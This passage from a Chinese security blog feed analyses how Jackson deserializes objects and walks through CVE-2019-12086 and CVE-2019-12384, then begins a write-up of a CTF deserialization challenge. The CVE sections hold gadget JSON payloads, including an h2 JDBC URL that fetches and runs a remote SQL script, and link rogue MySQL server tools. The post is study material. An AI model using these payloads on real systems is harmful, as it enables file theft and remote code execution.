    <content type="html"><![CDATA[<h2 id="使用Jackson"><a href="#使用Jackson" class="headerlink" title="使用Jackson"></a>使用Jackson</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial.jackson;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;default construct&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Constructor&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setNAme&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial.jackson;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(person);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(person1);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">//Constructor getName  </span></span><br><span class="line"><span class="comment">//getAge  </span></span><br><span class="line"><span class="comment">//&#123;&quot;name&quot;:&quot;n4c1&quot;,&quot;age&quot;:20&#125;  </span></span><br><span class="line"><span class="comment">//default construct setNAme  </span></span><br><span class="line"><span class="comment">//setAge  </span></span><br><span class="line"><span class="comment">//org.n4c1.unserial.jackson.Person@58651fd0</span></span><br></pre></td></tr></table></figure><p>被反序列化的类必须拥有一个无参构造器</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>大致过一遍jackson反序列化流程</p><p>断点打在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> mapper.readValue(json, Person.class);</span><br></pre></td></tr></table></figure><p>这一行, 跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810224836.png" alt="image.png"><br>可以看见给<code>_readMapAndClose</code>传了两个参数, 一个是<code>_jsonFactory.createParser</code>构建的<code>词法解析器</code>, 一个是<code>_typeFactory.constructType</code>构建的<code>type类型</code><br>词法解析器就没什么好看的, 不太可能涉及对象创建的方法调用</p><h3 id="SimpleType的创建"><a href="#SimpleType的创建" class="headerlink" title="SimpleType的创建"></a><code>SimpleType</code>的创建</h3><p>先看一下<code>_typeFactory.constructType</code>方法, 看看传进去的type是什么, 如何而来</p><p>跟进到<code>_fromAny</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225309.png" alt="image.png"><br>首先是对期望类(Person.class)的类型判断, 这里是Class<br>跟进到<code>_fromClass</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225642.png" alt="image.png"><br>首先是<code>_findWellKnownSimple</code>对基本类型的判断<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810225714.png" alt="image.png"><br>当然我们这里是自定义的类型, 会返回null</p><p>之后往下, 看起来是从最近构建的对象中查找, 类似缓存机制 由<code>bindings</code>和<code>_typeCache</code>这两个属性存储<br>当然这里是找不到的</p><p>之后实例了一个ClassStack作为context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810230324.png" alt="image.png"></p><p>大概还是用于还原对象, 这并不重要</p><p>中间一段是判断数组, 获取父类等, 不重要<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810230505.png" alt="image.png"></p><p>关键在于<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810231617.png" alt="image.png"><br>这里会调用<code>_newSimpleType</code>来创建一个新的<code>SimpleType</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810231731.png" alt="image.png"><br>返回的结果其实就是把我们自定义的<code>Person</code>类包装成类jackson自己的<code>SimpleType</code>来作为反序列化结果的类型<br>之后就是把得到的这个<code>SimpleType</code>放进<code>_typeCache</code>然后返回<br>那么我们还是回到<code>_readMapAndClose</code>看看实质上的反序列化过程</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810232247.png" alt="image.png"><br>可以看见4009行的获取反序列化器, 这个逻辑其实和fastjson很相似, 对不同的类型有不同的反序列化器, 这里获取到的应该是JavaBean反序列化器<br>具体创建过程先掠过, 直接去看反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233007.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233056.png" alt="image.png"><br>跟进</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233121.png" alt="image.png"><br>跟进<code>_valueInstantiator.createUsingDefault</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233209.png" alt="image.png"><br>直接调用到了Person类的构造器, 这个构造器应该就是在创建反序列化器的时候获取到的</p><p>接下来就是反序列化bean的property<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233420.png" alt="image.png"><br>跟进prop.deserializeAndSet<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250810233539.png" alt="image.png"><br>可以看见对setter进行了调用</p><p>所以对于这个<code>BeanDeserializer</code>有以下关键属性</p><ol><li><code>_valueInstantiator</code>: 记录了类的基本信息, 包括构造器, class信息, 用来实例化bean</li><li><code>_beanProperties</code>: 记录bean property信息, 包括名称, 字段的反序列化器, setter方法</li></ol><p>之后就是把得到的属性set到类实例中, 反序列化就基本上结束了</p><h2 id="CVE-2019-12086-mysql-fileRead"><a href="#CVE-2019-12086-mysql-fileRead" class="headerlink" title="CVE-2019-12086 mysql fileRead"></a>CVE-2019-12086 mysql fileRead</h2><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;com.mysql.cj.jdbc.admin.MiniAdmin\&quot;, \&quot;jdbc:mysql://127.0.0.1:3306/\&quot;]&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>漏洞范围在 2.x - 2.9.9</li><li>被攻击的程序 classpath 中要有 8.0.14 以下的版本的 Mysql 驱动</li><li>可被攻击的类 <code>com.mysql.cj.jdbc.admin.MiniAdmin</code></li></ul><p>这个打的是mysql fakeServer文件读取</p><p><strong>利用工具</strong></p><blockquote><p><a href="https://github.com/Gifts/Rogue-MySql-Server">https://github.com/Gifts/Rogue-MySql-Server</a><br><a href="https://github.com/BeichenDream/MysqlT/">https://github.com/BeichenDream/MysqlT/</a></p></blockquote><p>依赖<br>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2019-12384-h2-RCE"><a href="#CVE-2019-12384-h2-RCE" class="headerlink" title="CVE-2019-12384 h2 RCE"></a>CVE-2019-12384 h2 RCE</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-core --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0-alpha4<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2rce</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        objectMapper.enableDefaultTyping();<span class="comment">//开启 defaultTyping        </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectMapper.readValue(json, Object.class);<span class="comment">//反序列化对象  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> objectMapper.writeValueAsString(o);<span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DriverManagerConnectionSource.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DriverManagerConnectionSource</span> <span class="keyword">extends</span> <span class="title class_">ConnectionSourceBase</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">driverClass</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (driverClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">                Class.forName(driverClass);  </span><br><span class="line">                discoverConnectionProperties();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                addError(<span class="string">&quot;WARNING: No JDBC driver specified for logback DriverManagerConnectionSource.&quot;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;  </span><br><span class="line">            addError(<span class="string">&quot;Could not load JDBC driver class: &quot;</span> + driverClass, cnfe);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> ch.qos.logback.core.db.ConnectionSource#getConnection()  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (getUser() == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection(url, getUser(), getPassword());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Returns the url.     ** <span class="doctag">@return</span> String  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> String <span class="title function_">getUrl</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> url;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Sets the url.     ** <span class="doctag">@param</span> url  </span></span><br><span class="line"><span class="comment">     *          The url to set  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUrl</span><span class="params">(String url)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.url = url;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Returns the name of the driver class.     ** <span class="doctag">@return</span> String  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> String <span class="title function_">getDriverClass</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> driverClass;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * Sets the driver class.     ** <span class="doctag">@param</span> driverClass  </span></span><br><span class="line"><span class="comment">     *          The driver class to set  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDriverClass</span><span class="params">(String driverClass)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.driverClass = driverClass;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际调用点在getConnection, 因此需要序列化</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://b1ue.cn/archives/189.html">## Java 反序列化漏洞始末（4）— jackson</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用Jackson&quot;&gt;&lt;a href=&quot;#使用Jackson&quot; class=&quot;headerlink&quot; title=&quot;使用Jackson&quot;&gt;&lt;/a&gt;使用Jackson&lt;/h2&gt;&lt;p&gt;依赖&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;tabl</summary>
      
    
    
    
    <category term="JavaSec" scheme="http://example.com/categories/JavaSec/"/>
    
    
    <category term="Jackson" scheme="http://example.com/tags/Jackson/"/>
    
  </entry>
  
  <entry>
    <title>Java题目大杂烩</title>
    <link href="http://example.com/2024/08/31/Java%E9%A2%98%E7%9B%AE%E5%A4%A7%E6%9D%82%E7%83%A9/"/>
    <id>http://example.com/2024/08/31/Java%E9%A2%98%E7%9B%AE%E5%A4%A7%E6%9D%82%E7%83%A9/</id>
    <published>2024-08-31T05:36:08.000Z</published>
    <updated>2024-10-22T17:02:31.861Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2023-初赛-DeserBug"><a href="#CISCN-2023-初赛-DeserBug" class="headerlink" title="[CISCN 2023 初赛]DeserBug"></a>[CISCN 2023 初赛]DeserBug</h2><p>题目给出的cc依赖版本为3.2.2</p><p>相对于经典的3.2.1, 几个重要的类被禁止反序列化了</p><p>例如<code>InvokerTransformer</code>重写了<code>readObject</code> <code>writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream os)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">   FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">   os.defaultWriteObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">   FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">   is.defaultReadObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上在3.2.2中以下这些类都被禁用了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WhileClosure</span><br><span class="line">CloneTransformer</span><br><span class="line">ForClosure</span><br><span class="line">InstantiateFactory</span><br><span class="line">InstantiateTransformer</span><br><span class="line">InvokerTransformer</span><br><span class="line">PrototypeCloneFactory</span><br><span class="line">PrototypeSerializationFactory</span><br></pre></td></tr></table></figure><p>那么考虑字节码加载</p><p>看一下题目源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 